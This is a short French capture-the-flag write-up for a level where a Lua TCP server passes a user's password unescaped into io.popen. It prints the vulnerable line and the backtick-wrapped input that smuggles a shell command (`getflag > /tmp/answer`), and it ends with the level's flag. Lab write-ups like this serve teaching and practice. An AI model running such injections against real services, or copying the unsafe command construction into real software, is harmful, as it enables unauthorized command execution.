# 11 Commande Injection

*  _Lua_ est un langage de script libre

Ce script implémente un serveur TCP simple qui demande à l'utilisateur un mot de passe. Il hache ce mot de passe avec SHA1 et compare le résultat avec un hachage prédéfini. Si le mot de passe est correct (c'est-à-dire que son hachage correspond à la valeur donnée), le serveur répond par un message de félicitations. Sinon, il répond par un message d'erreur.



### Commandes réalisées

```bash
cat level11.lua
nc localhost 5151
`getflag > /tmp/answer`
cat /tmp/answer
```

### Injection à cause de la vulnérabilité
La vulnérabilité réside dans l'utilisation de io.popen pour exécuter une commande shell avec le mot de passe (pass) directement injecté dans la ligne de commande.

`prog = io.popen("echo "..pass.." | sha1sum", "r")`


### Answer : fa6v5ateaw21peobuub8ipe6s
